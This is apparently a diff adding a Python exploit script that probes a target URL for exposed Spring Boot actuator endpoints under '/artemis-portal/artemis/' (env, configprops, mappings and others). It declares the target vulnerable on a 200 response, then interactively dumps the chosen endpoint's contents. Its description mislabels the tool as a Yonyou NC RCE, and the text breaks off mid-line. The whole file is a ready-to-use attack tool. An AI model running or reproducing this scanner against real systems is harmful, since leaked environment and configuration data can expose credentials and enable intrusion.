@@ -1,0 +1,61 @@
+import requests,sys,argparse,re,time,os
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    ico="""
+ .------..------..------..------..------.
+|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
+| :/\: || (\/) || :/\: || :/\: || (\/) |
+| (__) || :\/: || :\/: || (__) || :\/: |
+| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
+`------'`------'`------'`------'`------'
+        """
+    print(ico)
+
+
+def main():
+    banner()
+    parger=argparse.ArgumentParser(description='用友nc——RCE')
+    parger.add_argument('-u','--url',dest='url',type=str,help="INPUT URL")
+    args=parger.parse_args()
+    if args.url:
+            if poc(args.url):
+                exp(args.url)
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+#先判断网站是否能正常访问，如果能访问调用exp
+def poc(target):
+    try:
+        api='/artemis-portal/artemis/loggers'
+        res=requests.get(url=target+api,verify=False,timeout=6)
+        if res.status_code==200:
+                    print(f"存在漏洞！！！！")
+                    return True       
+    except:
+        print(f"[-]{target}   请求异常或不存在漏洞")  
+#exp
+def exp(target):
+    time.sleep(2)
+    os.system("cls")
+    while True:
+        # 用字典保存接口
+        apis = {
+            'api1': '/artemis-portal/artemis/env',
+            'api2': '/artemis-portal/artemis/metrics',
+            'api3': '/artemis-portal/artemis/metrics/http.server.requests',
+            'api4': '/artemis-portal/artemis/loggers',
+            'api5': '/artemis-portal/artemis/configprops',
+            'api6': '/artemis-portal/artemis/info',
+            'api7': '/artemis-portal/artemis/mappings',
+            'api8': '/artemis-portal/artemis/health'
+        }
+        # 用户选择接口
+        cmd = input("请选择你要查看的接口：(api1, api2, api3, api4, api5, api6, api7, api8)(q退出)：   ")
+        # 根据用户输入获取对应的接口
+        if cmd in apis:
+            selected_api = apis[cmd]
+            res = requests.get(url=target + selected_api, verify=False,timeout=6)
+            if res.status_code == 200:
+                print(res.text)
+                if len(res.content)<1
